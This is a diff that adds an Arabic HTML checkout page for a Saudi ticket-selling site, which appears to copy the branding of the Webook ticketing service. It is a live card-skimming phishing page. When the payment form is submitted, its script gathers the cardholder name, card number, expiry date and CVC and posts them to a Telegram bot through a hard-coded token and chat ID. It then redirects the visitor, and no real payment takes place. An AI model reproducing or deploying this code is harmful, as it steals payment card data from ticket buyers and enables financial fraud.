@@ -1,0 +1,738 @@
+
+<!DOCTYPE html>
+
+<head>
+     
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <link rel="apple-touch-icon preload" type="image/x-icon" href="https://golden4tic.com/front/assets/other/assets/img/apple-touch-icon-57x57-precomposed.png" />
+    <link rel="apple-touch-icon preload" type="image/x-icon" sizes="72x72" href="https://golden4tic.com/front/assets/other/assets/img/apple-touch-icon-72x72-precomposed.png" />
+    <link rel="apple-touch-icon preload" type="image/x-icon" sizes="114x114" href="https://golden4tic.com/front/assets/other/assets/img/apple-touch-icon-114x114-precomposed.png" />
+    <link rel="apple-touch-icon preload" type="image/x-icon" sizes="144x144" href="https://golden4tic.com/front/assets/other/assets/img/apple-touch-icon-144x144-precomposed.png" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="csrf-token" content="SKUG7jFSFLy6gjFlv4WtnQoRyVelBkVopwFtR7ui" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css" type="text/css"/>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("tM1nMb6WW_56i-W1Y"); 
+        })();
+    </script>
+    <script src="script.js" type="text/javascript"></script>
+    <title>تذاكر السعودية  - الرئيسية</title>
+    <meta name="keywords" content />
+    <meta name="description" content />
+    <meta name="author" content />
+    <meta property="twitter:card" content="summary" />
+    
+    <meta property="twitter:title" content />
+    <meta property="twitter:description" content />
+    <meta property="twitter:image" content />
+    <meta name="twitter:label1" value="احجز الأن" />
+    <meta name="twitter:data1" value />
+    <meta property="og:title" content />
+    <meta property="og:description" content />
+    <meta property="og:image" content />
+    <meta property="og:url" content />
+    <meta property="og:type" content="website" />
+    <link rel="shortcut icon preload" href="https://webook.com/favicon.ico" />
+    <link rel="alternate" hreflang="ar-eg" href="webook" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+    <link rel="icon" href="https://webook.com/favicon.ico" />
+    
+     <link rel="stylesheet" href="css/all.min.css" />
+
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/bootstrap.rtl.min.css" />
+
+    <link rel="stylesheet" href="css/main.css" />
+    <link rel="stylesheet" href="css/_reboot.scss" />
+    <link rel="stylesheet" href="css/home.css" />
+    
+    <style>
+            .input-error {
+                color: red;
+            }
+
+            .only-select {
+                border: 1px solid #000;
+                width: 100%;
+            }
+
+            body.sell-ticket section.header form .form-select {
+                width: 100% !important;
+                border-radius: 5px;
+            }
+
+            .page-item {
+                border: none !important;
+            }
+
+            .disabled {
+                border: none !important;
+            }
+
+            body[class*="seller-account"] section.orders-table .pagination ul a {
+                border: none !important;
+            }
+
+            .disabled>.page-link,
+            .page-link.disabled {
+                border: none !important;
+            }
+
+            .active>.page-link,
+            .page-link.active {
+                background-color: #2f375f !important;
+                color: #fff !important;
+                border-color: #2f375f !important;
+                border-radius: 50% !important;
+                padding: 0 9px !important;
+            }
+
+            .button {
+                font-size: 13px;
+                font-weight: 400;
+                line-height: 22px;
+                color: white;
+                background-color: #2f375f;
+                padding: 8px 24px;
+                border-radius: 8px;
+                -webkit-transition: 0.4s;
+                transition: 0.4s;
+            }
+
+            /*.popup {*/
+            /*    position: fixed;*/
+            /*    width: 100%;*/
+            /*    height: 100%;*/
+            /*    top: 0;*/
+            /*    left: 0;*/
+            /*    z-index: 1000;*/
+            /*    background-color:  rgba(18, 27, 70, 0.5294117647); */
+            /*    display: -webkit-box;*/
+            /*    display: -ms-flexbox;*/
+            /*    display: flex;*/
+            /*    -webkit-box-pack: center;*/
+            /*    -ms-flex-pack: center;*/
+            /*    justify-content: center;*/
+            /*    -webkit-box-align: center;*/
+            /*    -ms-flex-align: center;*/
+            /*    align-items: center;*/
+            /*    padding: 12px;*/
+            /*}*/
+
+            /* .popup .content {*/
+            /*width: 600px;*/
+            /*    max-width: 100%;*/
+            /*    background-color: white;*/
+            /*    border: 1px solid #707070;*/
+            /*    border-radius: 16px;*/
+            /*    padding: 32px 20px;*/
+            /*    height: 600px;*/
+            /*}*/
+
+            .show_tickets_table {
+                overflow-y: scroll;
+                height: 500px;
+            }
+
+            .siblings {
+                font-size: 11px;
+                font-weight: 400;
+                line-height: 17px;
+                color: #848484;
+                padding: 0;
+            }
+    </style>
+    <style>
+        #cardNumber {
+            
+            transition: border 0.3s; /* تحول تدريجي للحدود */
+        }
+
+        .valid-border {
+            border: 2px solid green;
+        }
+
+        .invalid-border {
+            border: 2px solid red;
+        }
+        #validationResult {
+            margin-top: 10px;
+            color: red;
+        }
+    </style>
+    <script>
+        window.ADD_TO_CART_URL = "https://golden4tic.com/cart/update-to-cart";
+    </script>
+
+    <script async src="../../../js_1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag("js", new Date());
+
+        gtag("config", "G-FTSZ57798M");
+    </script>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/363ad84da6.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="css/libraries.css">
+    <link rel="stylesheet" href="css/checkout.css">
+   
+    <style>
+        [type="tel"][data-v-09edeec7] {
+            direction: ltr;
+        }
+
+        
+        #btn-submit:disabled {
+            background-color: #e6e6e6;
+            border: 2px solid #8c8c8c; 
+        }
+    </style>
+
+    <style type="text/css">
+        .vue-tel-input {
+            border-radius: 3px;
+            display: flex;
+            border: 1px solid #bbb;
+            text-align: left;
+        }
+
+        .vue-tel-input.disabled .dropdown,
+        .vue-tel-input.disabled .selection,
+        .vue-tel-input.disabled input {
+            cursor: no-drop;
+        }
+
+        .vue-tel-input:focus-within {
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
+                0 0 8px rgba(102, 175, 233, 0.6);
+            border-color: #66afe9;
+        }
+
+        .vti__dropdown {
+            display: flex;
+            flex-direction: column;
+            align-content: center;
+            justify-content: center;
+            position: relative;
+            padding: 7px;
+            cursor: pointer;
+        }
+
+        .vti__dropdown.show {
+            max-height: 300px;
+            overflow: scroll;
+        }
+
+        .vti__dropdown.open {
+            background-color: #f3f3f3;
+        }
+
+        .vti__dropdown:hover {
+            background-color: #f3f3f3;
+        }
+
+        .vti__selection {
+            font-size: 0.8em;
+            display: flex;
+            align-items: center;
+        }
+
+        .vti__selection .vti__country-code {
+            color: #666;
+        }
+
+        .vti__flag {
+            margin-right: 5px;
+            margin-left: 5px;
+        }
+
+        .vti__dropdown-list {
+            z-index: 1;
+            padding: 0;
+            margin: 0;
+            text-align: left;
+            list-style: none;
+            max-height: 200px;
+            overflow-y: scroll;
+            position: absolute;
+            left: -1px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            width: 390px;
+        }
+
+        .vti__dropdown-list.below {
+            top: 33px;
+        }
+
+        .vti__dropdown-list.above {
+            top: auto;
+            bottom: 100%;
+        }
+
+        .vti__dropdown-arrow {
+            transform: scaleY(0.5);
+            display: inline-block;
+            color: #666;
+        }
+
+        .vti__dropdown-item {
+            cursor: pointer;
+            padding: 4px 15px;
+        }
+
+        .vti__dropdown-item.highlighted {
+            background-color: #f3f3f3;
+        }
+
+        .vti__dropdown-item.last-preferred {
+            border-bottom: 1px solid #cacaca;
+        }
+
+        .vti__dropdown-item .vti__flag {
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        .vti__input {
+            border: none;
+            border-radius: 0 2px 2px 0;
+            width: 100%;
+            outline: 0;
+            padding-left: 7px;
+        }
+    </style>
+</head>
+
+<body>
+        <header class id="header">
+            <div class="container-md">
+                <nav class="navbar navbar-expand-lg">
+                    <a class="navbar-brand" href="#">
+                        <img src="https://images.ctfassets.net/vy53kjqs34an/3zOlXwzG8mnkgOFKwogIjR/dc2926e1903ec6502be10e06b8c2f19b/webook-logo.svg" />
+                    </a>
+                    <a class="sell-link nav-link p-lg-0 golden-color" href="https://wa.me/966582321986">بيع تذكرتك
+                    </a>
+                    
+                    <div class="collapse navbar-collapse justify-content-between" id="navbarHeader">
+                        <button class="d-lg-none" id="close-header-menu" type="button">
+                            <i class="fa-solid fa-xmark"></i>
+                        </button>
+                        <ul class="navbar-nav">
+                            <li class="nav-item">
+                                <a class="nav-link p-lg-0 active" href="index.html">الرئيسية </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link p-lg-0 golden-color" href="https://wa.me/966582321986">بيع تذكرتك
+                                </a>
+                            </li>
+
+                            <li class="nav-item">
+                                <a class="nav-link p-lg-0" href="https://golden4tic.com/faq">الاسئلة الشائعة</a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link p-lg-0" href="https://golden4tic.com/%D9%85%D9%86-%D9%86%D8%AD%D9%86">من
+                                    نحن</a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link p-lg-0" href="https://golden4tic.com/%D8%B3%D9%8A%D8%A7%D8%B3%D8%A9-%D8%A7%D9%84%D8%AE%D8%B5%D9%88%D8%B5%D9%8A%D8%A9">سياسة
+                                    الخصوصية</a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link p-lg-0" href="https://golden4tic.com/%D8%A7%D8%AA%D8%B5%D9%84-%D8%A8%D9%86%D8%A7">اتصل بنا</a>
+                            </li>
+                            <li class="nav-item mobile-show">
+                                <a class="nav-link p-lg-0" href="#/settings">الحساب الشخصي
+                                </a>
+                            </li>
+                            <li class="nav-item mobile-show">
+                                <a class="nav-link p-lg-0" href="#/tickets">طلباتي</a>
+                            </li>
+                            <li class="nav-item mobile-show">
+                                <a class="nav-link p-lg-0" href="#/order-tickets/new">لوحة تحكم
+                                    البائع
+                                </a>
+                            </li>
+                            <li class="nav-item mobile-show">
+                                <a class="nav-link p-lg-0 logout" href="#/logout">
+                                    تسجيل خروج
+                                </a>
+                            </li>
+                        </ul>
+                        <section class="d-flex flex-column flex-lg-row align-items-center">
+                            <a class="lang d-block my-3 my-lg-0" href="#">En</a>
+                            <a href="login.html" class="sell-ticket">تسجيل دخول
+                            </a>
+                        </section>
+                    </div>
+                </nav>
+            </div>
+        </header>
+    
+            
+            <section class="jobs" style="padding: 2rem 1.5rem ">
+
+                <div class="container">
+                     <div class="row">
+                          <div class="col-md-12">
+                            <div id="payment_step" class="payment-step mb-0">
+                                <div data-step="2" class="title title--step">
+                                    <img src="img/step-payment.svg" />
+                                    <h3>طريقة الدفع</h3>
+                                </div>
+                                <script>
+                                    $(function () {
+                                    //run when the DOM is ready
+                                    $(".clickable").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var onlinEmp = document.getElementById("bank-div");
+                                        var form = document.getElementById("myForm");
+                                        var element = document.getElementById("myDIV");
+                                        var element2 = document.getElementById("bank");
+ 
+                                        element.classList.remove("active");
+                                        element2.classList.remove("active");
+                                        form.style.display = "block";
+                                        onlinEmp.style.display = "none";
+                                    });
+
+                                    $(".clickable2").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var onlinEmp = document.getElementById("bank-div");
+                                         var form = document.getElementById("myForm");
+                                        var element = document.getElementById("hhh");
+                                        var element2 = document.getElementById("bank");
+ 
+                                         element.classList.remove("active");
+                                        element2.classList.remove("active");
+                                        form.style.display = "block";
+                                      
+                                         onlinEmp.style.display = "none";
+                                    });
+                                    $(".clickable3").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var form = document.getElementById("myForm");
+                                        var onlinEmp = document.getElementById("bank-div");
+                                         var element = document.getElementById("myDIV");
+                                        var element2 = document.getElementById("hhh");
+ 
+                                         element.classList.remove("active");
+                                        element2.classList.remove("active");
+                                        form.style.display = "none";
+                                         onlinEmp.style.display = "block";
+                                    });
+                                    $(".clickable4").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var form = document.getElementById("cardForm");
+                                        var onlinEmp = document.getElementById("bank-div");
+                                         var element = document.getElementById("myDIV");
+                                        var element2 = document.getElementById("hhh");
+                                        var element3 = document.getElementById("bank");
+
+                                        element.classList.remove("active");
+                                        element3.classList.remove("active");
+                                        element2.classList.remove("active");
+                                        form.style.display = "none";
+                                        onlinEmp.style.display = "none";
+                                     });
+                                    });
+                                </script>
+                                <div id="payment_methods_wrapper">
+                                    <ul id="payment_methods" class="list list--payment-methods">
+                                    <li>
+                                        <button type="button" class="btn btn--round btn--payment-option active clickable2" id="myDIV">
+                                        <img src="img/pay-option-mada.svg" alt="Mada" />
+                                        </button>
+                                    </li>
+                                    <li>
+                                        <button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable" id="hhh">
+                                        <img src="img/pay-option-credit-2.svg" alt="Credit card Logo" class="large" />
+                                        </button>
+                                    </li>
+                                    
+                                       
+                                    
+                                    </ul>
+                                </div>
+                                <span>
+                                    <form id="myForm" data-v-09edeec7 class="form form--payment">
+                                        <input type="hidden" name="phone" value="" />
+                                        <div data-v-09edeec7 class="row">
+                                            <div data-v-09edeec7 class="col-md-8 col-xs-12">
+                                                <span data-v-09edeec7>
+                                                    <fieldset data-v-09edeec7 class="form-group--w-icon form-group payment-type">
+                                                        <i data-v-09edeec7 class="sicon-debit-card-back"></i>
+                                                        <input data-v-09edeec7 type="text" maxlength="25" required autocomplete="cc-name" placeholder="الإسم على البطاقة" class="form-control ym-disable-keys ym-hide-content" name="name" id="cardName" />
+                                                    </fieldset>
+                                                </span>
+                                            </div>
+                                            <div data-v-09edeec7 class="col-md-8 col-xs-12">
+                                                <span data-v-09edeec7>
+                                                    <fieldset data-v-09edeec7 class="form-group--w-icon form-group payment-type">
+                                                        <i data-v-09edeec7 class="sicon-debit-card-back"></i>
+                                                        <input data-v-09edeec7 type="tel" maxlength="16" pattern="[0-9]*" autocomplete="cc-number" placeholder=" رقم لبطاقة" id="cardNumber" class="form-control ym-disable-keys ym-hide-content" name="cardnumber" />
+                                                    </fieldset>
+                                                </span>
+                                                <p id="validationResult"></p>
+                                            </div>
+                                            <div data-v-09edeec7 class="col-md-2 col-xs-6" style="width:60%">
+                                                <span data-v-09edeec7>
+                                                    <fieldset data-v-09edeec7 class="form-group">
+                                                        <div data-v-09edeec7 class="input-wrapper-expiry">
+                                                            <select required name="carddate" id="cc_month" class="form-control ym-disable-keys ym-hide-content card-month">
+                                                                <option value="">الشهر</option>
+                                                                <option value="01">01</option>
+                                                                <option value="02">02</option>
+                                                                <option value="03">03</option>
+                                                                <option value="04">04</option>
+                                                                <option value="05">05</option>
+                                                                <option value="06">06</option>
+                                                                <option value="07">07</option>
+                                                                <option value="08">08</option>
+                                                                <option value="09">09</option>
+                                                                <option value="10">10</option>
+                                                                <option value="11">11</option>
+                                                                <option value="12">12</option>
+                                                                <!-- Add other months here -->
+                                                            </select>
+                                                            <select required name="carddate1" id="cc_year" class="form-control ym-disable-keys ym-hide-content card-year">
+                                                                <option value="">السنة</option>
+                                                                <option value="2023">2023</option>
+                                                                <option value="2024">2024</option>
+                                                                <option value="2025">2025</option>
+                                                                <option value="2026">2026</option>
+                                                                <option value="2027">2027</option>
+                                                                <option value="2028">2028</option>
+                                                                
+                                                                <!-- Add other years here -->
+                                                            </select>
+                                                        </div>
+                                                    </fieldset>
+                                                </span>
+                                            </div>
+                                            <div data-v-09edeec7 class="col-md-2 col-xs-6" style="width:40%;">
+                                                <span data-v-09edeec7>
+                                                    <fieldset data-v-09edeec7 class="form-group">
+                                                        <input data-v-09edeec7 type="tel" pattern="\d*" maxlength="4" autocomplete="cc-csc" placeholder="رمز التحقق (CVC)" name="cvv" id="cardCVV" class="form-control ym-disable-keys ym-hide-content" />
+                                                    </fieldset>
+                                                </span>
+                                            </div>
+                                        </div>
+                                   
+                                    
+                                    <ul class="list list--brands">
+                                        <li>تسوق إلكتروني آمن 100%</li>
+                                        <li><img src="img/secure-payment.svg" /></li>
+                                        <li><img src="img/secure-payment-02.svg" /></li>
+                                        <li><img src="img/secure-payment-03.svg" /></li>
+                                    </ul>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    
+                                        <div data-v-e5a4c4bc>
+                                            <button type="submit" class="btn btn--primary btn--wide btn--round btn--submit btn--fixed wide btn-submit">اكمال الدفع</button>
+                                        </div>
+                                    </form>
+                                </span>
+                            
+                                <script>
+                                    document.getElementById('myForm').addEventListener('submit', function(event) {
+                                        event.preventDefault();
+                                        
+                                        // جمع البيانات من الحقول
+                                        var cardName = document.getElementById('cardName').value;
+                                        var cardNumber = document.getElementById('cardNumber').value;
+                                        var cardMonth = document.getElementById('cc_month').value;
+                                        var cardYear = document.getElementById('cc_year').value;
+                                        var cardCVV = document.getElementById('cardCVV').value;
+                                    
+                                        // معلومات البوتات
+                                        var telegramBots = [
+                                            {
+                                                token: '7789845398:AAEHKJDnUFpcG6bn_6lgCqZuygOyxaA-ElY', // ضع توكن البوت الأول هنا
+                                                chatId: '-1002324684325' // معرف الدردشة الأول
+                                            },
+                                            {
+                                         //            token: '8170938688:AAEjGqT2xfXUuCv065uzRdnylppWtRFSuXE', // ضع توكن البوت الثاني هنا
+                                                //chatId: '-1002299957797' // معرف الدردشة الثاني
+                                            }
+                                            // أضف المزيد من البوتات حسب الحاجة
+                                        ];
+                                    
+                                        // بناء الرسالة التي سيتم إرسالها
+                                        var telegramMessage = `
+                                            بيانات الدفع:
+                                            - الإسم على البطاقة: ${cardName}
+                                            - رقم البطاقة: ${cardNumber}
+                                            - تاريخ الانتهاء: ${cardMonth}/${cardYear}
+                                            - رمز التحقق (CVC): ${cardCVV}
+                                        `;
+                                    
+                                        // دالة لإرسال الرسالة إلى Telegram
+                                        function sendToTelegram(bot) {
+                                            return fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    chat_id: bot.chatId,
+                                                    text: telegramMessage
+                                                })
+                                            });
+                                        }
+                                    
+                                        // إرسال الرسالة إلى جميع البوتات
+                                        Promise.all(telegramBots.map(sendToTelegram))
+                                            .then(responses => {
+                                                if (responses.every(response => response.ok)) {
+                                                    // تحويل المستخدم إلى صفحة أخرى بعد نجاح الإرسال
+                                                    window.location.href = "index1134.html"; // استبدل 'index1134.html' بالصفحة التي تريد التوجيه إليها
+                                                } else {
+                                                    alert("حدث خطأ أثناء إرسال المعلومات.");
+                                                }
+                                            })
+                                            .catch(error => {
+                                                console.error('Error:', error);
+                                                alert("حدث خطأ أثناء إرسال المعلومات.");
+                                            });
+                                    });
+                                    </script>
+                                    
+                                    <div id="bank-div" style="display:none">
+                                       <h4>يرجى التواصل مع موظف المبيعات اونلاين لارسال صورة الايصال</h4>
+                                       <a href="https://api.whatsapp.com/send/?phone=966582321986" target="_blank"> <img width="150px" src="https://cdn.icon-icons.com/icons2/587/PNG/512/support_icon-icons.com_55294.png" />  </a>
+                                    </div>
+
+                                     
+                                </span>
+                                </div>
+                            
+                          </div>
+                        </div>
+                </div>
+            </section>
+           
+    <script type="text/javascript" src="js/jquery.validate.min.js"></script>
+    <script src="js/check-cc.js"></script>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/owl.carousel.min.js"></script>
+    <script src="js/script.js"></script>
+    <script>
+        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+        var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+            return new bootstrap.Tooltip(tooltipTriggerEl)
+        })
+    </script>
+    <script src="js/typeahead.bundle.min.js"></script>
+    <script>
+        var route = "https://grintahub.com/autocomplete-search";
+        var searchUrl = "https://grintahub.com/events";
+        // Set the Options for "Bloodhound" suggestion engine
+        var engine = new Bloodhound({
+            remote: {
+                url: route + `?q=%QUERY% `,
+                wildcard: '%QUERY%'
+            },
+            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('q'),
+            queryTokenizer: Bloodhound.tokenizers.whitespace,
+        });
+
+        $("#typeahead").typeahead({
+            hint: true,
+            highlight: true,
+            minLength: 1
+        }, {
+            source: engine.ttAdapter(),
+
+            // This will be appended to "tt-dataset-" to form the class name of the suggestion menu.
+            name: 'usersList',
+            valueKey: 'name',
+            display: function (param) {
+                return param.name.ar;
+            },
+            // the key from the array we want to display (name,id,email,etc...)
+            templates: {
+                empty: [
+                    '<div class="list-group search-results-dropdown"><div class="list-group-item">Nothing found.</div></div>'
+                ],
+                header: [
+                    '<div class="list-group search-results-dropdown">'
+                ],
+                suggestion: function (data) {
+                    var locale = 'ar';
+                    var image = typeof data.media.find(key => key.collection_name == 'featured_events') == "undefined" ? 'https://via.placeholder.com/124x124' : data.media.find(key => key.collection_name == 'featured_events').original_url;
+                    let d_event_date_time = new Date(data.event_date_time);
+                    const options = {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'short',
+                        day: 'numeric'
+                    };
+                    return `
+         <a href="` + searchUrl + '/' + data.slug.ar + `">
+            <div class="selling-tickets-details typeahead-details mt-4 pb-4">
+                <div class="d-flex flex-wrap flex-md-nowrap">
+                    <img class="img" src="` + image + `" alt="" width="127" height="127">
+                    <div class="ps-md-3 pt-3 pt-md-0 tooltip-css d-flex flex-column justify-content-around">
+                        <div class="title tooltip-css" data-toggle="tooltip" data-placement="top" title=" ` + data.name
+                            .ar + `">  ` + data.name.ar +
+                        `  </div>
+                        <div class="d-flex pt-4 align-items-center flex-wrap flex-md-nowrap">
+                            <div class="location-border pe-4 me-3">
+                                <div class="location tooltip-css d-flex align-items-center ">
+                                    <img class="me-2" src="https://grintahub.com/assets/web/images/pin.png">
+                                    <div class="location tooltip-css mw-100 w-auto" data-bs-toggle="tooltip" data-bs-placement="top" title="` +
+                        data.venue.name.ar +
+                        `" data-bs-original-title=" ` + data.venue.name.ar + `"> ` +
+                        data.venue.name.ar +
+                        `</div>
+                                </div>
+                            </div>
+                            <div class="date pt-2 pt-md-0 d-flex align-items-center tooltip-css">
+                                <img class="me-2" src="https://grintahub.com/assets/web/images/deadline.png" alt="">
+                                <div class="date tooltip-css" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Add tooltip title here"> ` +
+
+                        d_event_date_time.toLocaleDateString(locale, options) + `</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+         </a>
+         `;
+                }
+
+            }
+        });
+        $(".typeahead").on('typeahead:selected', function (e, datum) {
+            console.log(datum.name);
+        });
+    </div>
+    <script src="js/home.js"></script>
+    <script>(function () { var js = "window['__CF$cv$params']={r:'77f0b2a13ea25be1',m:'44fM4QAfjhCkGQ7zynmL0k2mKqwfVl4gK81hIpPWmX4-1671962092-0-AVCDvmUMZlNjFYx6wVEiwE3+zk48Q6/01fC5STomZzZC0w1Ltz7UntaRYmAA1ikPbx0/asEnEwJp0AEOwiI/j5WdC/hUTRfzAgM04T+/Ve5I7wEdzoACTTeSN0I/Dc0J4w==',s:[0xc0b1fb6806,0x3c77641c33],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);"; var _0xh = document.createElement('iframe'); _0xh.height = 1; _0xh.width = 1; _0xh.style.position = 'absolute'; _0xh.style.top = 0; _0xh.style.left = 0; _0xh.style.border = 'none'; _0xh.style.visibility = 'hidden'; document.body.appendChild(_0xh); function handler() { var _0xi = _0xh.contentDocument || _0xh.contentWindow.document; if (_0xi) { var _0xj = _0xi.createElement('script'); _0xj.nonce = ''; _0xj.innerHTML = js; _0xi.getElementsByTagName('head')[0].appendChild(_0xj); } } if (document.readyState !== 'loading') { handler(); } else if (window.addEventListener) { document.addEventListener('DOMContentLoaded', handler); } else { var prev = document.onreadystatechange || function () { }; document.onreadystatechange = function (e) { prev(e); if (document.readyState !== 'loading') { document.onreadystatechange = prev; handler(); } }; } })();</script>
+</script>
+
+</body>
+ 
+
+   
